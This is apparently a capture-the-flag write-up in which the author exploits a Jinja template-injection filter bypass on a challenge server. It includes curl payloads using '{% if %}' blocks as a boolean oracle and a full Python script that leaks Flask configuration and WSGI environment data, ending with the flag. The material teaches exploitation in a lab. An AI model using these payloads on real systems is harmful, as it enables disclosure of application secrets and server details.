---
layout: post
title:  "Web Challenges"
date:   2026-08-17 20:01:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /0xV01D-ctf-2026-web/
---
* TOC
{:toc}
{% raw %}
## Directive

**Category**: Web

**Author**: `0x4sh`

**Description**: The card previewer is paranoid about the loud parts of templates. The quiet parts are older, stranger, and still listening. Make the renderer confess without using the obvious echo syntax. URL: `http://35.192.106.100:21002/`

Going to the site:

![Alt text](/images/voidweb1.png)

When I click 'preview' it takes me to `http://35.192.106.100:21002/preview?name=guest` and renders my input on the page:
```shell
## Welcome guest

Enjoy the wave.
```

Previewing something like `{{7*7}}` gets rejected:
```shell
curl "http://35.192.106.100:21002/preview?name=\{\{7*7\}\}"  
template guard rejected that token
```

I found a boolean oracle. Any `{% if condition %}1{% endif %}` outputs `1` when `condition` is true. Example of the oracle (`{% if 1==1 %}1{% endif %}`):
```shell
curl "http://35.192.106.100:21002/preview?name=\{%25%20if%201==1%20%25%7D1%7B%25%20endif%20%25%7D"  
<main><h2>Welcome 1</h2><p>Enjoy the wave.</p></main>
```

Otherwise:
```shell
curl "http://35.192.106.100:21002/preview?name=\{%25%20if%201==2%20%25%7D1%7B%25%20endif%20%25%7D"  
<main><h2>Welcome </h2><p>Enjoy the wave.</p></main>
```

I eventually got this python to work with a binary search to leak the contents:
```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://35.192.106.100:21002/preview"
SESSION = requests.Session()

def send_payload(payload):
    encoded = urllib.parse.quote(payload, safe='')
    r = SESSION.get(f"{BASE}?name={encoded}", timeout=10)
    return "Welcome 1" in r.text

def get_char_at(expr, i):
    lo_c, hi_c = 32, 126
    while lo_c < hi_c:
        mid_c = (lo_c + hi_c) // 2
        c = chr(mid_c)
        # handle single quote by switching to double quote annoying driving me crazy ahahhahaaa
        if c == "'":
            payload = f'{{% if ({expr})[{i}] <= "{c}" %}}1{{% endif %}}'
        else:
            payload = f"{{% if ({expr})[{i}] <= '{c}' %}}1{{% endif %}}"
        if send_payload(payload):
            hi_c = mid_c
        else:
            lo_c = mid_c + 1
    return chr(lo_c)

def leak_string(expr, max_len=600):
    lo, hi = 0, max_len
    length = 0
    while lo <= hi:
        mid = (lo + hi) // 2
        if send_payload(f"{{% if ({expr})|length > {mid} %}}1{{% endif %}}"):
            length = mid + 1
            lo = mid + 1
        else:
            hi = mid - 1
    print(f"Length: {length}")

    result = ['?'] * length
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = {executor.submit(get_char_at, expr, i): i for i in range(length)}
        done = 0
        for future in as_completed(futures):
            i = futures[future]
            result[i] = future.result()
            done += 1
            print(f"\r({done}/{length}) {''.join(result)}", end='', flush=True)
    print()
    return ''.join(result)

if __name__ == "__main__":
    # print(leak_string("config|string"))
    print(leak_string("request.environ|string"))
```
`config` is the flask app configuration settings and `request.environ` is the WSGI request environment (http headers, server info, request metadata).

It did leak the contents:
```shell
python3 some_ssti.py  
Length: 601  
(1/601) ?C???????????????????????????????????????????????????????? 

... etc ...

(601/601) <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None,  
'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOA
```
It took a long time to run.

I started on the `request.environ`:
```shell
python3 some_ssti.py  
Length: 1354  
(1/1354) {?????????????????????????????

... etc ...

(447/1354) {'wsgi.version': (1, 0), 'wsgi.url_scheme': 'http', 'wsgi.input': <_io.BufferedReader name=6>, 'wsgi.errors): <_io.TextIOWrapper name='<stderr>' mode='w' encoding=' utf-8'>, 'wsgi.multithread': True, 'wsgi.multiprocess': False, 'wsgi.run_once': False, 'werkzeug.sockemi*% <sckht.socket fd=9, eafalyl792t sgpe, proto=0, laddr=('172.28.0.2', 8080+0)1addr=)'159.26.000.000', 55465,>, (LERVER_RNQTWAR7/:"'XertveuO13/1.8',&'RDREQUESU]MEOHOD)87EC', 'OCRI
```
This was taking a LONG time and I think the mulithreading messed it up. I was only using 2 threads... sad.

I finally quit being impatient and let it run. Final output:
```shell
(767/767) <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None,  
'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'TREASURE': '0xV01D{jinja_statement_blocks_are_templates_too}'}>
```
{% endraw %}
`0xV01D{jinja_statement_blocks_are_templates_too}`
